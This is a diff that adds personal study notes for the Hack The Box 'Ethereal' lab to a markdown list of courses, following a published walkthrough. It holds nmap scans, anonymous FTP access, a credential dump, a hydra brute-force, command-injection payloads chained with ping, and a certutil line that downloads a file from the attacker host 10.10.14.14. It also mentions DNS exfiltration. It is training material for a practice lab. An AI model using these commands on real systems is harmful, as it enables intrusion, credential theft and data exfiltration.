@@ -113,6 +113,99 @@ other courses
 
 http://www.practicalnetworking.net/
 
+## Ethereal
+https://0xdf.gitlab.io/2019/03/09/htb-ethereal.html
+
+`nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.106`
+
+`nmap -sC -sV -p 21,80,8080 -oA nmap/scripts 10.10.10.106`
+
+`nmap -sU -p- --min-rate 10000 -oA nmap/alludp 10.10.10.106`
+
+### ftp access 
+
+`ftp 10.10.10.106`
+
+anonymous login check
+
+`anonymous`
+
+`dir`
+`bin` - to convert to binary files 
+and then using gets
+
+`unzip DISK1.zip`
+
+`unzip FDISK.zip`
+
+`file *DISK{,1,2}`
+
+`mount -o loop FDISK /mnt/fdisk`
+
+`tree /mnt/fdisk`
+
+## Password Box - software 
+
+`apt install libncurses6:i386 bwbasic`
+
+to install password box
+
+./pbox --dump
+
+cat usernames
+cat passwords
+
+http site
+
+tcp 8080
+
+find hostname - ethereal.htb:8080
+
+http://10.10.10.106:8080
+
+/etc/hosts file name 
+
+http://ethereal.htb:8080
+
+## using hydra
+
+`hydra -L usernames -P passwords -s 8080 -f ethereal.htb http-get /`
+
+`http://127.0.0.1`
+
+`tcpdump -i tun0 icmp`
+
+## Shell as Alan
+
+for RCE discovery it is essential to find out ot which combination of commands work and then find the tcpdump
+
+command1 && command2 - meaning run one if second succeds
+command1 || command2 - means if 1 fails
+command1 & command2 - meaning run both
+
+## Powershell
+
+So if I enter & dir || ping 10.10.14.14, I don’t get pings in tcpdump, because the dir succeeds and ends the or. If I change that to & dir && ping 10.10.14.14, I do get pings.
+
+So now I can see if I can run PowerShell. I’ll enter & powershell -c echo test || ping 10.10.14.14. Unfortunately, I get pings. So PowerShell is not available to me.
+
+## certutil file transfer
+
+& certutil -urlcache -split -f http://10.10.14.14/test.txt \windows\temp\test.txt|| ping 10.10.14.14
+
+## nslookup file transfer
+
+using dns exfil to give interaction with the system
+using dns for file transfer
+
+creating a python based shell transfer code dns sniffer-
+
+https://0xdf.gitlab.io/2019/03/09/htb-ethereal-shell.html
+
+
+
+
+
 
 
 
